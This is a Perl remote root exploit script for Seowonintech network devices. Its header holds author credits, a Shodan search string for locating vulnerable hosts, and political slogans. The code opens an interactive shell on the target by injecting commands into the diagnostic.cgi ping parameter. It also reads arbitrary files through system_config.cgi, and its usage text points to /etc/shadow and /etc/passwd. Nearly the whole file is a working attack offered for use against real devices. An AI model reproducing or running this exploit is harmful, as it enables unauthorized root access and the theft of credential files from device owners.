#!/usr/bin/perl
#       
#  [+] Seowonintech all device remote root exploit v2
# =====================================================
# author:                 | email:
# Todor Donev  (latin)    | todor dot donev 
# Òîäîð Äîíåâ  (cyrillic) | @googlemail.com    
# =====================================================
# type:    | platform:    | description:
# remote   | linux        | attacker can get root
# hardware | seowonintech | access on the device
# =====================================================
# greetings to:
# Stiliyan Angelov,Tsvetelina Emirska,all elite 
# colleagues and all my friends that support me. 
# =====================================================
# warning:
# Results about 37665 possible vulnerabilities
# from this exploit.
# =====================================================
# shodanhq dork: 
# thttpd/2.25b 29dec2003 Content-Length: 386 Date: 2013
# =====================================================
# P.S. Sorry for buggy perl.. :)
# 2o13 Hell yeah from Bulgaria, Sofia
#
#    Stop Monsanto Stop Monsanto Stop Monsanto
#
#       FREE GOTTFRID SVARTHOLM WARG FREE
# GOTTFRID SVARTHOLM WARG is THEPIRATEBAY co-founder 
# who was sentenced to two years in jail by Nacka 
# district court, Sweden on 18.06.2013 for hacking into
# computers at a company that manages data for Swedish
# authorities and making illegal online money transfers.
 
use LWP::Simple qw/$ua get/;
my $host  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
if(not defined $ARGV[0])
{
     usg();
     exit;
}
print "[+] Seowonintech all device remote root exploit\n";
$diagcheck = $host."/cgi-bin/diagnostic.cgi";
$syscheck = $host."/cgi-bin/system_config.cgi";
$res = $ua->get($diagcheck) || die "[-] Error: $!\n";
print "[+] Checking before attack..\n";
if($res->status_line != 200){
     print "[+] diagnostic.cgi Status: ".$res->status_line."\n";
     }else{
     print "[o] Victim is ready for attack.\n";
     print "[o] Status: ".$res->status_line."\n";  
     if(defined $res =~ m{selected>4</option>}sx){
     print "[+] Connected to $ARGV[0]\n";
     print "[+] The fight for the future Begins\n";
     print "[+] Exploiting via remote command execution..\n";
     print "[+] Permission granted, old friend.\n";
     &rce;
     }else{
     print "[!] Warning: possible vulnerability.\n";
     exit;
    }   
  }
$res1 = $ua->get($syscheck) || die "[-] Error: $!\n";
if($res1->status_line != 200){
     print "[+] system_config.cgi Status: ".$res1->status_line."\n";
     exit;
     }else{
     print "[+] Trying to attack via remote file disclosure release.\n";
     if(defined $syscheck =~ s/value=\'\/etc\/\'//gs){
     print "[+] Victim is ready for attack.\n";
     print "[+] Connected to $ARGV[0]\n";
     print "[o] Follow the white cat.\n";
     print "[+] Exploiting via remote file dislocure..\n";
     print "[+] You feeling lucky, Neo?\n";
     &rfd;
     }else{
     print "[!] Warning: Possible vulnerability. Believe the unbelievable!\n";
     exit;
    }
  }
sub rfd{
while(1){ 
     print "# cat ";
     chomp($file=<STDIN>);
     if($file eq ""){ print "Enter full path to file!\n"; }
     $bug = $host."/cgi-bin/system_config.cgi?file_name=".$file."&btn_type=load&action=APPLY";
     $data=get($bug) || die "[-] Error: $ARGV[0] $!\n";
     $data =~ s/Null/File not found!/gs;
     if (defined $data =~ m{rows="30">(.*?)&lt;/textarea&gt;}sx){
     print $1."\n";
     }
   }
}
sub rce{
while(1){ 
     print "# ";
     chomp($rce=<STDIN>);
     $bug = $host."/cgi-bin/diagnostic.cgi?select_mode_ping=on&ping_ipaddr=-q -s 0 127.0.0.1;".$rce.";&ping_count=1&action=Apply&html_view=ping";
     $rce =~ s/\|/\;/;
     if($rce eq ""){print "enter Linux command\n";}
     if($rce eq "clear"){system $^O eq 'MSWin32' ? 'cls' : 'clear';}
     if($rce eq "exit" || $rce eq "quit"){print "There is no spoon...\n"; exit;}
     $data=get($bug) || die "[-] Error: $!\n";
     if (defined $data =~ m{(\s.*) Content-type:}sx){
     $result = substr $1, index($1, ' loss') or substr $1, index($1, ' ms');
     $result =~ s/ loss\n//;     
     $result =~ s/ ms\n//;
     print $result;
    }
  }
}
sub usg
{
     print " [+] Seowonintech all device remote root exploit\n";
     print " [!] by Todor Donev todor dot donev @ googlemail.com\n";
     print " [?] usg: perl $0 <victim>\n";
     print " [?] exmp xpl USG: perl $0 192.168.1.1 :)\n";
     print " [1] exmp xpl RCE: # uname -a :)\n";
     print " [2] exmp xpl RFD: # cat /etc/webpasswd or /etc/shadow, maybe and /etc/passwd :P\n";
}